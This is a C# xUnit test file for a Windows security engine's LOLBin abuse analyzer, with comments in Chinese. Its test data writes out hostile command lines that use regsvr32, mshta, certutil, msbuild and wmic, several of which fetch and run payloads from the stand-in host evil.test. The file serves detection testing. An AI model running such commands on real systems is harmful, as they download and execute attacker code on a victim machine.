using System.Linq;
using Bulwark.Core.Engine;
using Bulwark.Core.Models;
using Xunit;

namespace Bulwark.Core.Tests;

/// <summary>
/// LOLBins(白利用)滥用分析器:对「签名合法二进制 + 特征滥用参数」组合给出硬信号,
/// 对正常调用与非 LOLBin 不误报;并验证签名 LOLBin 被滥用时失去信任放行豁免。
/// </summary>
public class LolbinAnalyzerTests
{
    [Theory]
    [InlineData(@"C:\Windows\System32\regsvr32.exe",
        "regsvr32 /s /n /u /i:http://evil.test/a.sct scrobj.dll")]            // Squiblydoo
    [InlineData(@"C:\Windows\System32\mshta.exe",
        "mshta http://evil.test/p.hta")]                                       // 远程 HTA
    [InlineData(@"C:\Windows\System32\certutil.exe",
        "certutil -urlcache -split -f http://evil.test/p.exe p.exe")]          // 下载
    [InlineData(@"C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe",
        @"msbuild C:\Users\me\AppData\Local\Temp\build.csproj")]               // 内联任务
    [InlineData(@"C:\Windows\System32\wbem\wmic.exe",
        "wmic /node:10.0.0.5 process call create calc.exe")]                   // 远程执行
    public void KnownAbusePatterns_AreHardSignals(string actor, string cmd)
    {
        var (score, reasons, hard) = LolbinAnalyzer.Analyze(actor, cmd);
        Assert.True(hard, $"期望硬信号,实际 score={score}");
        Assert.True(score >= 35);
        Assert.NotEmpty(reasons);
        // 原因应带 ATT&CK 技战术编号
        Assert.Contains(reasons, r => r.Contains("T1"));
    }

    [Theory]
    [InlineData(@"C:\Windows\System32\notepad.exe", "notepad C:\\a.txt")]      // 非 LOLBin
    [InlineData(@"C:\Windows\System32\regsvr32.exe", "regsvr32 /s mylib.dll")] // 正常本地注册
    [InlineData(@"C:\app\my.exe", "my.exe --run")]                            // 普通程序
    public void NormalUsage_NoHardSignal(string actor, string cmd)
    {
        var (_, _, hard) = LolbinAnalyzer.Analyze(actor, cmd);
        Assert.False(hard);
    }

    [Fact]
    public void SignedSystemLolbin_Abused_LosesTrustAndIsBlocked()
    {
        // 微软签名、位于 System32 的 regsvr32 —— 正常会命中「强可信放行」。
        // 但带 Squiblydoo 远程 scriptlet 参数时,应失去豁免并被研判为高危拦截。
        var engine = new RuleEngine { TrustSignedActors = true };
        var e = new SecurityEvent
        {
            Type = EventType.ProcessCreate,
            ActorPath = @"C:\Windows\System32\regsvr32.exe",
            ActorSigned = true,
            ActorPublisher = "Microsoft Corporation",
            CommandLine = "regsvr32 /s /n /u /i:http://evil.test/a.sct scrobj.dll"
        };

        var verdict = engine.Evaluate(e);

        Assert.True(e.HasThreatIndicator);
        Assert.NotEqual(VerdictAction.Allow, verdict.Action);
        Assert.Contains(e.EvidenceChain, ev => ev.Source == "LolbinAnalyzer" && ev.Kind == EvidenceKind.HardIndicator);
    }

    [Fact]
    public void SignedSystemLolbin_NormalUse_StillAllowed()
    {
        // 同一个签名 regsvr32,做正常的本地 DLL 注册 —— 不应被误拦。
        var engine = new RuleEngine { TrustSignedActors = true };
        var e = new SecurityEvent
        {
            Type = EventType.ProcessCreate,
            ActorPath = @"C:\Windows\System32\regsvr32.exe",
            ActorSigned = true,
            ActorPublisher = "Microsoft Corporation",
            CommandLine = "regsvr32 /s C:\\Program Files\\App\\plugin.dll"
        };

        var verdict = engine.Evaluate(e);

        Assert.Equal(VerdictAction.Allow, verdict.Action);
    }
}
